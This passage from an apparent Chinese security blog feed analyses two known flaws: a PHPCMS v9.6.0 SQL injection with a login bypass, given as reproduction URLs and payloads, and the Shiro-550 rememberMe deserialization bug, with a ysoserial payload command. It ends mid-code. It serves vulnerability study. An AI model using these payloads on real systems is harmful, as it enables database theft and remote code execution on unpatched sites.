<p>&#x4E4B;&#x540E;&#x8C03;&#x7528; <code>download</code> &#x65B9;&#x6CD5;&#x3002;&#x7A0B;&#x5E8F;&#x76F4;&#x63A5;&#x8C03;&#x7528; <code>copy</code> &#x51FD;&#x6570;&#x5C06;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;&#x672C;&#x5730;</p>
<h2 id="wap&#x6A21;&#x5757;-SQL&#x6CE8;&#x5165;"><a href="#wap&#x6A21;&#x5757;-SQL&#x6CE8;&#x5165;" class="headerlink" title="wap&#x6A21;&#x5757; SQL&#x6CE8;&#x5165;"></a>wap&#x6A21;&#x5757; SQL&#x6CE8;&#x5165;</h2><h3 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;-1"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;-1" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h3><p>&#x8BBF;&#x95EE; <code>http://phpcms/index.php?m=wap&amp;a=index&amp;siteid=1</code></p>
<blockquote>
<p>PS: &#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x662F;&#x4E0D;&#x5177;&#x5907;war&#x6A21;&#x5757;&#x7684;&#xFF0C;&#x8DDF;&#x8FDB;&#x540E;&#x53F0;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x597D;&#x50CF;&#x8DDF;&#x624B;&#x673A;&#x95E8;&#x6237;&#x7F51;&#x7AD9;&#x6709;&#x5173;&#xFF0C;&#x4F46;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x5F71;&#x54CD;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;</p>
</blockquote>
<p>&#x76F4;&#x63A5;&#x53D1;&#x5305;&#x81F3; repeater &#x6A21;&#x5757;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/qFr95yWlGcEsjZM-20201117115108047.jpg" alt></p>
<p>&#x5C06;&#x8FD4;&#x56DE;&#x7684; <code>Set-Cookie</code> &#x4E2D;<code>TVAUD_siteid</code>&#x503C;&#x9644;&#x503C;&#x7ED9; <code>userid_flash</code>&#x53D8;&#x91CF;<br>&#x56E0;&#x6B64; <code>userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY</code></p>
<p>&#x8BBF;&#x95EE; </p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/phpcms/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5E76; POST &#x4F20;&#x53C2; <code>userid_flash=fe769BR9LpUDtV0xv0EoUJLPLr5-mlaX47zTpfBY</code><br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VSoJDEBZkU7Fsw8-20201117115108185.jpg" alt></p>
<p>&#x5C06;&#x8FD4;&#x56DE;&#x7684; <code>Set-Cookie</code> &#x4E2D;<code>TVAUD_att_json</code>&#x503C;&#x9644;&#x503C;&#x7ED9; <code>a_k</code>&#x53C2;&#x6570;</p>
<p>GET&#x578B;&#x8BBF;&#x95EE; </p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">http://phpcms/index.php?m=content&amp;c=down&amp;a_k=4639DgUMpurTOZjooOJq4TX6Y0Q_XVqujouwKcrfLTvAEJjgOjGhm4VLN5AZ3CQkIcSOFCoDh8V7NVmGuVvN6hrYV59KmsRC0SO-V_b6hLXhJxDw4DuOEQ1KS2RPKSae8keEN8PbbTo7fICqQnhDpFhUN5JSRgScbgnQggVE7d56earVmPST9Lw</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3fuanq7rCEoSyOZ-20201117115108205.jpg" alt></p>
<h3 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;-1"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;-1" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h3><p>&#x6F0F;&#x6D1E;&#x89E6;&#x53D1;&#x70B9;&#x5728; <code>phpcms/modules/content/down.php</code> &#x7684; <code>init()</code> &#x51FD;&#x6570;<br>12 &#x884C; GET&#x65B9;&#x5F0F;&#x4F20;&#x5165; <code>a_k</code>&#x53C2;&#x6570;<br>14 &#x884C; &#x6839;&#x636E; <code>DECODE</code> &#x5224;&#x65AD;&#x5176; <code>sys_auth</code> &#x4E3A;&#x4E00;&#x4E2A;&#x89E3;&#x5BC6;&#x51FD;&#x6570;&#x3002;&#x76F4;&#x63A5;&#x8BC1;&#x660E;&#x2014;&#x2014;&#x300B;<code>a_k</code>&#x53C2;&#x6570;&#x4E4B;&#x524D;&#x662F;&#x7ECF;&#x8FC7;&#x52A0;&#x5BC6;&#x7684;&#x3002;&#x8FD9;&#x4E2A;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x5176;&#x5B9E;&#x5F88;&#x957F;&#xFF0C;&#x6211;&#x4EEC;&#x5176;&#x5B9E;&#x4E0D;&#x7528;&#x53BB;&#x770B;&#x5B83;&#x7684;&#x4E00;&#x4E2A;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x3002;<br>17 &#x884C; &#x4F7F;&#x7528; <code>parse_str()</code> &#x51FD;&#x6570;&#x5904;&#x7406; &#x3002;  <code>parse_str()</code> &#x51FD;&#x6570;&#x4F1A;&#x81EA;&#x52A8;&#x5BF9;&#x4F20;&#x5165;&#x7684;&#x503C;&#x5C06;&#x5176;&#x6839;&#x636E;<code>&amp;</code>&#x5206;&#x5272;&#xFF0C;&#x7136;&#x540E;&#x89E3;&#x6790;&#x5230;&#x5177;&#x4F53;&#x53D8;&#x91CF;&#x5E76;&#x6CE8;&#x518C;&#x53D8;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x5BF9;&#x5185;&#x5BB9;&#x8FDB;&#x884C;URL&#x89E3;&#x7801;&#x64CD;&#x4F5C;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Y36mPkxv12pZhlM-20201117115108098.jpg" alt><br>26 &#x884C; &#x5F15;&#x7528;&#x672A;&#x6CE8;&#x518C;&#x53D8;&#x91CF; <code>array(&#x2018;id&#x2019;=&gt;$id)</code> &#xFF0C;&#x4F46;&#x8FD9;&#x91CC;&#x7684;<code>id</code>&#x53EF;&#x4EE5;&#x4ECE;<code>parse_str</code>&#x51FD;&#x6570;&#x5904;&#x7406;<code>$a_k</code>&#x540E;&#x5F97;&#x5230;&#x3002;&#x4E14;&#x8C03;&#x7528; <code>get_one</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p><code>get_one</code>&#x65B9;&#x6CD5;&#x5B9A;&#x4E49;&#x70B9;&#x5728;  <code>/phpcms/libs/classes/model.class.php</code> 73-76&#x884C;&#x3002;&#x8DDF;&#x8FDB;&#x53D1;&#x73B0;&#x8FD9;&#x91CC;&#x7684; <code>get_one</code> &#x65B9;&#x6CD5;&#x5176;&#x5B9E;&#x5C31;&#x662F; SQL &#x67E5;&#x8BE2;&#x3002;&#x4E14;&#x7528;&#x5230;&#x4E86; <code>sqls</code> &#x65B9;&#x6CD5;&#x3002;<br>&#x8DDF;&#x8FDB; <code>sqls</code> &#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x5BF9;&#x6570;&#x7EC4;&#x53C2;&#x6570;&#x7684;&#x4E00;&#x4E2A;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/VzLkrIoPJFl15Di-20201117115108399.jpg" alt><br>&#x4E14;&#x4ECE;&#x5934;&#x5230;&#x4F4D;&#x90FD;&#x6CA1;&#x6709;&#x5BF9;<code>$id</code> &#x53C2;&#x6570;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x5904;&#x7406;&#x3002;&#x56E0;&#x6B64;&#x5B58;&#x5728; sql &#x6CE8;&#x5165;&#x6F0F;&#x6D1E;</p>
<p>&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x6839;&#x636E; &#x4ECE;<code>parse_str</code>&#x51FD;&#x6570;&#x5904;&#x7406;<code>$a_k</code>&#x540E;&#x5F97;&#x5230;&#x7684; <code>id</code> &#x63A8;&#x65AD;&#x51FA;&#x4E86;&#x5B58;&#x5728; sql&#x6CE8;&#x5165;&#x3002;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x6211;&#x4EEC;&#x63A8;&#x65AD;&#x4E2D;&#x5FFD;&#x7565;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x89E3;&#x5BC6;&#x6D41;&#x7A0B;&#x3002;&#x56E0;&#x6B64;&#x5176;&#x5B9E;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x627E;&#x5230;&#x5E26;&#x6709; sql&#x6CE8;&#x5165;payload &#x7ECF;&#x8FC7;&#x4E00;&#x6B21;&#x52A0;&#x5BC6;&#x4E4B;&#x540E;&#x7684; payload&#x3002;</p>
<p><strong>&#x6838;&#x5FC3;&#x76EE;&#x7684;&#xFF1A;&#x6784;&#x9020;&#x52A0;&#x5BC6;&#x540E;&#x7684; <code>$a_k</code> &#x53D8;&#x91CF;</strong></p>
<p><strong>&#x601D;&#x8DEF;&#x4E00;&#xFF1A;&#x4F2A;&#x9020;&#x52A0;&#x5BC6;&#x8FC7;&#x7A0B;&#xFF1A;&#x76F4;&#x63A5;&#x5BF9;&#x5E94;&#x6E90;&#x7801;&#x4E2D;&#x52A0;&#x5BC6;&#x4EE3;&#x7801;&#xFF0C;&#x8FDB;&#x884C;&#x672C;&#x5730;&#x52A0;&#x89E3;&#x5BC6;&#x3002;</strong><br>&#x4EA7;&#x751F;&#x95EE;&#x9898;&#xFF1A;&#x6E90;&#x7801;&#x4E2D;&#x5BF9;&#x5E94;&#x7684; auth_key &#x503C;&#x6765;&#x81EA;&#x670D;&#x52A1;&#x5668;&#x3002;&#x4E14;&#x6BCF;&#x4E2A;&#x7AD9;&#x70B9;&#x8FD9;&#x4E2A; auth_key &#x53EF;&#x80FD;&#x4E0D;&#x4E00;&#x6837;&#x3002;</p>
<p><strong>&#x601D;&#x8DEF;&#x4E8C;&#xFF1A;&#x5BFB;&#x627E;&#x6E90;&#x7801;&#x4E2D;&#x8C03;&#x7528;&#x6B64;&#x52A0;&#x5BC6;&#x7684;&#x5730;&#x65B9;&#x3002;&#x4E14;&#x53EF;&#x56DE;&#x663E;&#x52A0;&#x5BC6;&#x540E;&#x4EE3;&#x7801;</strong><br>&#x65B9;&#x6CD5;&#xFF1A; &#x5168;&#x5C40;&#x641C;&#x7D22; sys_auth &#x3002;<br><code>phpcms\libs\classes\param.class.php</code> &#x4E2D;&#x5B58;&#x5728; <code>set_cookie</code> &#x65B9;&#x6CD5;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5BUeGSb2Oyzhqj4-20201117115108323.jpg" alt><br>&#x5BFB;&#x627E;&#x54EA;&#x91CC;&#x6CA1;&#x6709;&#x8FC7;&#x6EE4;sql&#x6CE8;&#x5165;&#x7684;&#x4F20;&#x5165;&#x70B9;&#x3002;&#x4E14;&#x53EF;&#x901A;&#x8FC7; cookie &#x52A0;&#x5BC6;&#x83B7;&#x5F97;&#x52A0;&#x5BC6;&#x540E; payload<br>&#x5173;&#x952E;&#x70B9;&#xFF1A;<code>phpcms/modules/attachment/attachments.php</code> &#x7684; <code>swfupload_json</code> &#x65B9;&#x6CD5;&#x3002;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">swfupload_json</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">	$arr[<span class="hljs-string">&apos;aid&apos;</span>] = intval($_GET[<span class="hljs-string">&apos;aid&apos;</span>]);</span><br><span class="line">	$arr[<span class="hljs-string">&apos;src&apos;</span>] = safe_replace(trim($_GET[<span class="hljs-string">&apos;src&apos;</span>]));</span><br><span class="line">	$arr[<span class="hljs-string">&apos;filename&apos;</span>] = urlencode(safe_replace($_GET[<span class="hljs-string">&apos;filename&apos;</span>]));</span><br><span class="line">	$json_str = json_encode($arr);</span><br><span class="line">	$att_arr_exist = param::get_cookie(<span class="hljs-string">&apos;att_json&apos;</span>);</span><br><span class="line">	$att_arr_exist_tmp = explode(<span class="hljs-string">&apos;||&apos;</span>, $att_arr_exist);</span><br><span class="line">	<span class="hljs-keyword">if</span>(is_array($att_arr_exist_tmp) &amp;&amp; in_array($json_str, $att_arr_exist_tmp)) {</span><br><span class="line">		<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;</span><br><span class="line">	} <span class="hljs-keyword">else</span> {</span><br><span class="line">		$json_str = $att_arr_exist ? $att_arr_exist.<span class="hljs-string">&apos;||&apos;</span>.$json_str : $json_str;</span><br><span class="line">		param::set_cookie(<span class="hljs-string">&apos;att_json&apos;</span>,$json_str);</span><br><span class="line">		<span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;			</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x901A;&#x8FC7; GET &#x4F20;&#x5165;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570; <code>aid</code> &#x7ECF;&#x8FC7;&#x4E86; <code>intval</code> &#x51FD;&#x6570;&#x5904;&#x7406;&#xFF0C;&#x90A3;&#x4E48;&#x4E0D;&#x592A;&#x9002;&#x5408;&#x901A;&#x8FC7;&#x6B64;&#x5904;&#x4F20;&#x5165;payload&#x3002;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570; <code>src</code> &#x7ECF;&#x8FC7;&#x4E86; <code>safe_replace</code>&#x5904;&#x7406;&#x3002;&#x7B2C;&#x4E09;&#x4E2A; <code>filename</code> &#x901A;&#x8FC7; <code>safe_replace</code> &#x548C; &#x4E00;&#x6B21;url &#x7F16;&#x7801;&#x5904;&#x7406;&#x3002;&#x4E4B;&#x540E;&#x505A; <code>json_encode</code> &#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x6700;&#x7EC8;&#x518D;&#x8C03;&#x7528; <code>set_cookie</code> &#x65B9;&#x6CD5;&#x3002;<br>&#x8DDF;&#x8FDB;&#x4E00;&#x4E0B; <code>safe_replace</code> &#x65B9;&#x6CD5;&#xFF0C;&#x53D1;&#x73B0;&#x662F;&#x901A;&#x8FC7; <code>str_replace</code> &#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x4E14;&#x6CA1;&#x6709;&#x901A;&#x8FC7;&#x5FAA;&#x73AF;&#x904D;&#x5386;&#x6765;&#x8FC7;&#x6EE4;&#xFF0C;&#x5B83;&#x53EA;&#x6267;&#x884C;&#x4E00;&#x6B21;&#x3002;&#x90A3;&#x4E48;&#x4E24;&#x4E24;&#x7EC4;&#x5408;&#x4E00;&#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x66FF;&#x6362;&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230; bypass &#x7684;&#x6548;&#x679C;&#x3002;<br><img src="/2019/11/23/PHPCMS-v9-6-0-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/fdxGa6P3iTprsV2-20201117115108325.jpg" alt></p>
<p>&#x4F46;&#x662F;&#x5728;&#x89E6;&#x53D1;  <code>set_cookie</code> &#x7684; <code>swfupload_json</code> &#x65B9;&#x6CD5;&#xFF0C;&#x4E4B;&#x524D;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x6761;&#x4EF6;&#x3002;<br>&#x5728;<code>phpcms/modules/attachment/attachments.php</code>&#x7B2C;&#x5341;&#x884C;&#x7684; <code>attachments</code> &#x7C7B;&#x3002;&#x5176;&#x4E2D; <code>__construct</code> &#x65B9;&#x6CD5;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x505A;&#x7C7B;&#x7684;&#x521D;&#x59CB;&#x5316;&#x5DE5;&#x4F5C;&#x3002;&#x5176;&#x4E2D;&#x6709;&#x7528;&#x6237;&#x767B;&#x5F55;&#x72B6;&#x6001;&#x68C0;&#x6D4B;&#x3002;21&#x884C;&#x9650;&#x5236; <code>$this&#x2192;userid</code> &#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&#xFF0C;&#x5426;&#x5219;&#x8DF3;&#x8F6C;&#x5230;&#x767B;&#x5F55;&#x754C;&#x9762;<br>17 &#x884C; &#x7A0B;&#x5E8F;&#x5E76;&#x6CA1;&#x6709;&#x68C0;&#x67E5; <code>$this-&gt;userid</code> &#x7684;&#x6709;&#x6548;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x8981;&#x4F20;&#x5165;&#x7684; <code>userid_flash</code> &#x662F;&#x52A0;&#x5BC6;&#x503C;&#x5C31;&#x80FD;&#x591F;&#x89E3;&#x5BC6;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x68C0;&#x6D4B;&#x3002;<br>&#x83B7;&#x53D6; <code>userid_flash</code>&#x52A0;&#x5BC6;&#x503C;&#xFF1A;&#x5728;<code>phpcms/modules/wap/index.php</code> &#x6587;&#x4EF6;&#x3002;&#x901A;&#x8FC7; cookie &#x83B7;&#x53D6; <code>$_GET[&#x2018;siteid&#x2019;]</code> &#x52A0;&#x5BC6;&#x540E;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x4F5C;&#x4E3A; <code>$_POST[&#x2018;userid_flash&#x2019;]</code> &#x7684;&#x503C;&#xFF0C;&#x5373;&#x53EF;&#x7ED5;&#x8FC7;&#x767B;&#x5F55;&#x68C0;&#x6D4B;&#x3002;</p>
<p>&#x53C2;&#x8003;&#x6587;&#x7AE0;</p>
<blockquote>
<p><a href="https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/18/phpcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/</a><br><a href="https://www.hackersb.cn/hacker/219.html" target="_blank" rel="noopener">https://www.hackersb.cn/hacker/219.html</a><br><a href="https://www.freebuf.com/articles/web/202914.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/202914.html</a><br><a href="http://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/" target="_blank" rel="noopener">http://blog.nsfocus.net/phpcms-v9-6-content-module-sql-injection-vulnerability-analysis/</a></p>
</blockquote>
</body></html>]]></content>
      <categories>
        <category>PHP Sec</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>SQLi</tag>
        <tag>PHPCMS</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-550 rememberMe 反序列化漏洞分析</title>
    <url>/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<html><head></head><body><p>&#x672C;&#x7BC7;&#x4E3A; Shiro550 (CVE-2016-4437) &#x7684;&#x6F0F;&#x6D1E;&#x590D;&#x73B0;&#x3001;&#x5206;&#x6790;&#x548C;&#x5B66;&#x4E60;</p>
<a id="more"></a>



<h1 id="&#x6F0F;&#x6D1E;&#x8BE6;&#x60C5;"><a href="#&#x6F0F;&#x6D1E;&#x8BE6;&#x60C5;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x8BE6;&#x60C5;"></a>&#x6F0F;&#x6D1E;&#x8BE6;&#x60C5;</h1><p><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a></p>
<p>Affects Version/s:1.2.4</p>
<h1 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h1><p>Check &#x91C7;&#x7528;&#x7A7A;&#x5BF9;&#x8C61;</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201213164250014.png" alt="image-20201213164250014"></p>
<p>Attack:</p>
<p>ysoserial POC</p>
<p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections2 <span class="hljs-string">&quot;open -a calculator&quot;</span>|base64 |sed <span class="hljs-string">&apos;:label;N;s/\n//;b label&apos;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>Exploit</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201213164942281.png" alt="image-20201213164942281"></p>
<h1 id="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"><a href="#&#x6F0F;&#x6D1E;&#x5206;&#x6790;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5206;&#x6790;"></a>&#x6F0F;&#x6D1E;&#x5206;&#x6790;</h1><p>Shiro 1.2.4&#x53CA;&#x4EE5;&#x4E0B;&#x7248;&#x672C;&#x4E0B;&#x9ED8;&#x8BA4; cookie &#x4E2D; rememberMe &#x5B57;&#x6BB5;&#x7684;&#x751F;&#x6210;&#x8FC7;&#x7A0B;</p>
<blockquote>
<ol>
<li>&#x5E8F;&#x5217;&#x5316;&#x6076;&#x610F;&#x5BF9;&#x8C61;&#xFF08;payload&#xFF09; </li>
<li>&#x5BF9;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;AES&#x52A0;&#x5BC6; </li>
<li>&#x5C06;&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;base64&#x7F16;&#x7801; </li>
<li>&#x53D1;&#x9001; rememberMe cookie</li>
</ol>
</blockquote>
<p>&#x56E0;&#x6B64;&#x5BF9;&#x5E94;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x903B;&#x8F91;&#x63A8;&#x6D4B;&#x5E94;&#x8BE5;&#x662F;&#xFF1A; &#x63A5;&#x53D7; rememberMe cookie -&gt; base64 &#x89E3;&#x7801; -&gt; AES &#x89E3;&#x5BC6; -&gt; &#x89E6;&#x53D1;&#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
<p>&#x6240;&#x4EE5;&#x5206;&#x6790;&#x7684;&#x91CD;&#x70B9;&#x5C31;&#x5728; rememberMe &#x7684;&#x751F;&#x6210;&#x548C; &#x670D;&#x52A1;&#x7AEF;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FD9;&#x91CC;</p>
<h2 id="&#x52A0;&#x5BC6;&#x6D41;&#x7A0B;"><a href="#&#x52A0;&#x5BC6;&#x6D41;&#x7A0B;" class="headerlink" title="&#x52A0;&#x5BC6;&#x6D41;&#x7A0B;"></a>&#x52A0;&#x5BC6;&#x6D41;&#x7A0B;</h2><p>&#x5728;&#x4E00;&#x4E2A;&#x6B63;&#x5E38;&#x7684;&#x767B;&#x5F55;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5F00;&#x542F; Remember Me &#x65F6;&#x3002;&#x82E5;<strong>&#x6210;&#x529F;&#x767B;&#x5F55;</strong>&#x4F1A;&#x89E6;&#x53D1; <code>AbstractRememberMeManager#onSuccessfulLogin</code></p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205182602444.png" alt="image-20201205182602444"></p>
<p>&#x5206;&#x6790;&#x5165;&#x53E3;&#x70B9; <code>AbstractRememberMeManager#onSuccessfulLogin</code> </p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onSuccessfulLogin</span><span class="hljs-params">(Subject subject, AuthenticationToken token, AuthenticationInfo info)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">this</span>.forgetIdentity(subject);</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isRememberMe(token)) {</span><br><span class="line">        <span class="hljs-keyword">this</span>.rememberIdentity(subject, token, info);</span><br><span class="line">    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (log.isDebugEnabled()) {</span><br><span class="line">        log.debug(<span class="hljs-string">&quot;AuthenticationToken did not indicate RememberMe is requested.  RememberMe functionality will not be executed for corresponding account.&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5173;&#x952E;&#x70B9;1:  <code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code> &#x548C;  <code>org.apache.shiro.mgt.AbstractRememberMeManager#isRememberMe</code>  &#x5224;&#x65AD;&#x662F;&#x5426;&#x542F;&#x7528;&#x4E86; Remember Me &#x529F;&#x80FD;</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205203026308.png" alt="image-20201205203026308"></p>
<p><code>principals</code> &#x5BF9;&#x8C61;&#x5728; <code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</code> &#x521B;&#x5EFA;</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205204001354.png" alt="image-20201205204001354"></p>
<p><code>principals</code>  &#x7684;&#x503C;</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205203805460.png" alt="image-20201205203805460"></p>
<p>&#x5173;&#x952E;&#x70B9;2&#xFF1A;&#x5E8F;&#x5217;&#x5316;&#x3001;&#x52A0;&#x5BC6;&#x5BF9;&#x8C61;</p>
<p><img src="/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201205204617882.png" alt="image-20201205204617882"></p>
<p>&#x4F9D;&#x6B21;&#x770B;&#x4E00;&#x4E0B;&#x5E8F;&#x5217;&#x5316;&#x8FD9;&#x4E00;&#x6B65;&#x7684;&#x6B65;&#x9AA4;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-comment">// org.apache.shiro.mgt.AbstractRememberMeManager.convertPrincipalsToBytes</span></span><br><span class="line"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) {</span><br><span class="line">    <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">this</span>.serialize(principals);</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// org.apache.shiro.mgt.AbstractRememberMeManager.serialize</span></span><br><span class="line"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] serialize(PrincipalCollection principals) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.getSerializer().serialize(principals);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// org.apache.shiro.io.DefaultSerializer#serialize</span></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] serialize(T o) <span class="hljs-keyword">throws</span> SerializationException {</span><br><span class="line">    <span class="hljs-keyword">if</span> (o == <span class="hljs-keyword">null</span>) {</span><br><span class="line">        String msg = <span class="hljs-string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(msg);</span><br><span class="line">    } <span class="hljs-keyword">else</span> {</span><br><span class="line">        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        BufferedOutputStream bos = <span class="hljs-keyword">new</span> BufferedOutputStream(baos);</span><br><span class="line"></span><br><span class="line">        <span 